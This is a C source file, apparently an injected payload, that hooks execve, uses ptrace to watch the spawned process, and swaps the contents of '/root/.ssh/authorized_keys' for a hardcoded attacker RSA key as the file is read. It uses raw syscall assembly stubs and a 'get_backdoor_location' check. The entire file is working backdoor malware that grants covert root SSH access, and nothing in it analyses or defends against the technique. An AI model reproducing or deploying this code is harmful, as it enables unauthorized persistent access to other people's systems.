#include "trace_utils.h"
#include <linux/ptrace.h>
#include <stdint.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>

uint32_t *
get_backdoor_location ()
{
  asm ("lea rax, [r9]");
}

uint64_t
sys_ptrace (enum __ptrace_request op, pid_t pid, void *addr, void *data)
{
  asm ("push 0x65; pop rax; syscall");
}

void
sys_wait ()
{
  asm ("push 0x3d; pop rax; syscall");
}

void
sys_execve (const char *path, char *const argv[])
{
  asm ("xor rdx, rdx; push 0x3b; pop rax; syscall");
}

void
sys_open (const char *path, int flags)
{
  asm ("push 0x2; pop rax; syscall");
}

void
sys_exit ()
{
  asm ("xor rdi, rdi; push 0x3c; pop rax; syscall");
}

int
sys_fork ()
{
  asm ("push 0x39; pop rax; syscall");
}

void
copy_to_tracee (uint32_t pid, uint64_t addr, uint8_t *data, uint32_t len)
{
  uint64_t ptr = 0;

  while (ptr < len)
    {
      uint64_t data_cur = ((uint64_t *)data)[ptr / sizeof (uint64_t)];
      sys_ptrace (PTRACE_POKETEXT, pid, (void *)addr + ptr, (void *)data_cur);
      ptr += 8;
    }
}
void
copy_from_tracee (uint32_t pid, uint64_t addr, char *data, uint32_t len)
{
  uint64_t ptr = 0;

  while (ptr < len)
    {
      sys_ptrace (PTRACE_PEEKTEXT, pid, (void *)addr + ptr, data);
      ptr += 8;
    }
}

void
attach (uint32_t pid)
{
  sys_ptrace (PTRACE_ATTACH, pid, NULL, NULL);
  sys_wait ();
}

void
detach (uint32_t pid)
{
  sys_ptrace (PTRACE_DETACH, pid, NULL, NULL);
}

void
next_step (uint32_t pid)
{
  sys_ptrace (PTRACE_SINGLESTEP, pid, NULL, NULL);
  sys_wait ();
}

void
next_syscall (uint32_t pid)
{
  sys_ptrace (PTRACE_SYSCALL, pid, NULL, NULL);
  sys_wait ();
}

void
get_syscall_info (uint32_t pid, struct ptrace_syscall_info *info)
{
  sys_ptrace (PTRACE_GET_SYSCALL_INFO, pid, (void *)sizeof (*info), info);
}

void
execv_hook (const char *path, char *const argv[])
{
  if (*get_backdoor_location () == 16)
    sys_execve (path, argv);

  uint32_t pid;
  if ((pid = sys_fork ()) == 0)
    sys_execve (path, argv);

  char authorized_key[] = "/root/.ssh/authorized_keys";
  char buf[] = "aaaabbbbccccdddd";

  attach (pid);
  struct ptrace_syscall_info info;
  while (1)
    {
      while (1)
        {
          next_syscall (pid);
          get_syscall_info (pid, &info);
          if (info.op == PTRACE_SYSCALL_INFO_ENTRY && info.entry.nr == 0x2)
            break;
        }
      copy_from_tracee (pid, info.entry.args[0], buf, 0x10);
      if (((uint64_t *)buf)[0] == ((uint64_t *)authorized_key)[0]
          && ((uint64_t *)buf)[1] == ((uint64_t *)authorized_key)[1])
        break;
    }
  // now session trying to open authorized_key

  while (1)
    {
      next_syscall (pid);
      get_syscall_info (pid, &info);
      if (info.op == PTRACE_SYSCALL_INFO_ENTRY && info.entry.nr == 0x0)
        break;
    }
  // now session trying to read authorized_key
  uint8_t backdoor_key[]
      = "ssh-rsa "
        "AAAAB3NzaC1yc2EAAAADAQABAAAAgQDo/"
        "EEjP+HKnQwwuZHda5xhKjEPLCLenjIyku6nKbwu+"
        "AOj3ZyJIdDRFp3YWIl5sVIT88P9u4je9hnq043yuscnCThgeE3TZqqohFbUk+"
        "tmvhoRTiMTv5ZanCce3HRDKMpcgTKlN4yJ3Fuy8EGlInFEEqvDA4uDeojKagPr9yi6Rw="
        "= dbgbgtf@MSI";
  void *read_to = (void *)info.entry.args[1];
  next_syscall (pid);
  get_syscall_info (pid, &info);
  copy_to_tracee (pid, (uint64_t)read_to, backdoor_key, sizeof (backdoor_key));

  detach(pid);
}
